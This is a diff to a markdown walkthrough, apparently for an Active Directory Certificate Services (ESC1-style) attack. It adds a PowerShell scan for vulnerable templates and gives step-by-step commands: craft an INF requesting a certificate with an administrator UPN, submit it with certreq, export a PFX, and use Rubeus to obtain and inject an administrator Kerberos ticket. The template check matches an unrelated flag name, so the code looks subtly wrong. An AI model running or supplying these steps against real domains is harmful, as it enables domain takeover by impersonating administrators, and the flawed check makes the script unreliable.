@@ -19,7 +19,38 @@ Enjoy learning and, most importantly, stay safe!
 
 ## **Step-by-Step Instructions**
 
-### 1. **Create an INF file**
+### 1. **Find The Vulnerable Templates:**
+```
+$templateBlocks = $templates -split "Template\["
+
+foreach ($block in $templateBlocks) {
+
+    if ($block -match "TemplatePropCommonName = (.+)") {
+        $templateName = $matches[1]
+    } else {
+        continue
+    }
+
+
+    $hasClientAuth = $block -match "1\.3\.6\.1\.5\.5\.7\.3\.2"
+
+
+    $hasSupplyInRequest = $block -match "CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS"
+
+
+    $hasEnrollPermissions = $block -match "Allow Enroll.*Authenticated Users" -or $block -match "Allow Enroll.*Domain Users"
+
+    if ($hasClientAuth -and $hasSupplyInRequest -and $hasEnrollPermissions) {
+        Write-Output "Template: $templateName"
+        Write-Output "  - Client Authentication EKU Found"
+        Write-Output "  - Supply in Request Found"
+        Write-Output "  - Enroll Permission for Authenticated Users or Domain Users Found"
+        Write-Output ""
+    }
+}
+```
+
+### 2. **Create an INF file**
 ```ini
 [Version]
 Signature="$Windows NT$"
@@ -53,33 +84,33 @@ Additionally, update the continue record as well:
 _continue_ = "dns=shkud.local&upn=administrator@shkud.local"
 ```
 
-### 2. **After creating the INF file, generate a CSR file using the following command:**
+### 3. **After creating the INF file, generate a CSR file using the following command:**
 ```
 certreq -new My_request.inf My_request.csr
 ```
 
-### 3. **Next, submit the CSR to the CA server, specifying the desired certificate template, and save the issued certificate:**
+### 4. **Next, submit the CSR to the CA server, specifying the desired certificate template, and save the issued certificate:**
 ```
 certreq -submit -attrib "CertificateTemplate:My_Template" My_request.csr My_Cert.cer
 ```
 
-### 4. **Finally, accept and install the issued certificate using the following command:**
+### 5. **Finally, accept and install the issued certificate using the following command:**
 ```
 certreq -accept My_Cert.cer
 ```
 
-### 5. **Next, locate the Thumbprint of the certificate by running the following command:**
+### 6. **Next, locate the Thumbprint of the certificate by running the following command:**
 ```
 Get-ChildItem Cert:\CurrentUser\My
 ```
 
-### 6. **Afterward, generate a PFX file by executing the following commands:**
+### 7. **Afterward, generate a PFX file by executing the following commands:**
 ```
 $password = ConvertTo-SecureString -String '1qaz!QAZ' -AsPlainText -Force
 Export-PfxCertificate -Cert Cert:\CurrentUser\My\5440925da4167c5f92cd9cf66a4f68622f63e1c7 -FilePath administrator.pfx -Password $password
 ```
 
-### 7. **Now, with the PFX file, you can use Rubeus to request a TGT (Ticket Granting Ticket) using the certificate. Execute the following command:**
+### 8. **Now, with the PFX file, you can use Rubeus to request a TGT (Ticket Granting Ticket) using the certificate. Execute the following command:**
 ```
 .\Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:1qaz!QAZ /dc:dc.shkud.local /domain:shkud.local /ptt
 ```
